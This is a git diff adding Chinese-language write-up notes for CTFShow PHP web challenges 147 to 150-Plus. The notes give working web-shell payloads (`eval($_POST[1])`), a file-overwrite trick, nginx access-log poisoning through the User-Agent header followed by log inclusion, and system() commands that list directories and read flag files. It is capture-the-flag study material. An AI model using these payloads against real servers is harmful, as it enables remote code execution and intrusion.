@@ -418,36 +418,52 @@ D              $ 必须严格匹配字符串结尾
 ctf=\create_function
 
 
+## 147
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784677054410_image.png)
 
 
 
 
 
 
+## 148
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784679851644_image.png)
+
+1.GET: `?ctf=index.php`  POST:`show=<?php eval($_POST[1]);?>`
+2.POST: 1=system("ls /")
+
+## 149
+
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784682057630_image.png)
+扫描当前目录，除了index其他的都删掉。然后再写，写完之后又在判断。
+
+我们把index覆盖掉
+GET：`?ctf=index.PHP`
+show=`<?php eval(&_POST[1]);?>`   只有一次机会
+
+刷新后，POST：`1=system('ls /');`发现flag,cat 就行
 
 
+## 150
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784855869868_image.png)
+日志文件包含 “/var/log/nginx/access.log”
 
+显示在`user-Agent` 中写入 `<?php eval($_POST[1]);?>` 不要写错只要有一次机会
 
+GET：isVIP=ture
 
+POST：`ctf=/var/log/nginx/access.log&1=phpinfo();`尝试可以包含
 
+接下来：`1=system("ls");`以及`1=system("cat flag.php");`
 
+## 150-Plus
+![image.png](https://img.xobear.cn/file/CTF/WEB/CTFShow/1784857062346_image.png)
+包含条件更加严格，伪协议用不了，日志也不行了
 
+当进行一个类判断的时候(`class_exists`) 就自动调用`__autoload`
+GET:`?..CTFSHOW..=phpinfo`  phpinfo里有flag
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+----
 
 
 
